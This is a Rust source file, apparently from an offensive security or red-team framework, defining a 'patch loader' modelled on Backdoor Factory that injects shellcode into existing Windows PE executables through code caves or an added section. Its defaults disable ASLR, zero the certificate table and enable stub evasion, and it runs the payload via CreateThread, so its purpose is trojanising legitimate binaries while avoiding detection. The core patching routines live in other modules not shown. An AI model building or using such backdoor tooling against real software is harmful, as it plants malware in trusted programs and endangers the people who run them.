//! Patch-based loader generation using BDF (Backdoor Factory)
//!
//! Injects shellcode into existing PE binaries via code cave or new section.

use super::bdf::evasion::StubEvasion;
use super::bdf::pe::{ExecutionTechnique, PatchPeOptions, ThreadWait};
use super::LoaderGenerator;
use anyhow::Result;

/// Patch loader configuration
#[derive(Debug, Clone)]
pub struct PatchLoader {
    /// Target PE binary path
    pub target_binary: Option<String>,
    /// Force adding a new section
    pub add_section: bool,
    /// Section name for new section
    pub section_name: String,
    /// Minimum code cave size
    pub min_cave_size: usize,
    /// Disable ASLR
    pub disable_aslr: bool,
    /// Zero certificate table
    pub zero_cert: bool,
    /// Thread wait strategy
    pub thread_wait: ThreadWait,
    /// Execution technique
    pub execution_technique: ExecutionTechnique,
    /// Stub evasion configuration
    pub evasion: StubEvasion,
}

impl Default for PatchLoader {
    fn default() -> Self {
        Self {
            target_binary: None,
            add_section: false,
            section_name: ".sdata".to_string(),
            min_cave_size: 380,
            disable_aslr: true,
            zero_cert: true,
            thread_wait: ThreadWait::None,
            execution_technique: ExecutionTechnique::CreateThread,
            evasion: StubEvasion::default(),
        }
    }
}

impl PatchLoader {
    /// Patch the target PE binary with the given shellcode
    pub fn patch(&self, shellcode: &[u8]) -> Result<Vec<u8>> {
        let target = self
            .target_binary
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("Target binary path is required"))?;

        let data = std::fs::read(target)
            .map_err(|e| anyhow::anyhow!("Failed to read target binary '{}': {}", target, e))?;

        let options = PatchPeOptions {
            add_section: self.add_section,
            section_name: self.section_name.clone(),
            min_cave_size: self.min_cave_size,
            disable_aslr: self.disable_aslr,
            zero_cert: self.zero_cert,
            thread_wait: self.thread_wait.clone(),
            execution_technique: self.execution_technique.clone(),
            evasion: self.evasion.clone(),
        };

        super::bdf::pe::patch_pe(&data, shellcode, &options)
    }

    /// Find code caves in the target PE binary
    pub fn find_caves(&self) -> Result<Vec<super::bdf::CodeCave>> {
        let target = self
            .target_binary
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("Target binary path is required"))?;

        let data = std::fs::read(target)
            .map_err(|e| anyhow::anyhow!("Failed to read target binary '{}': {}", target, e))?;

        let parsed = goblin::pe::PE::parse(&data)
            .map_err(|e| anyhow::anyhow!("Failed to parse PE: {}", e))?;

        let caves = super::bdf::pe::find_pe_caves(&parsed, &data, self.min_cave_size);

        Ok(caves)
    }
}

impl LoaderGenerator for PatchLoader {
    fn generate(&self, payload: &[u8]) -> Result<Vec<u8>> {
        self.patch(payload)
    }

    fn name(&self) -> &'static str {
        "patch"
    }
}
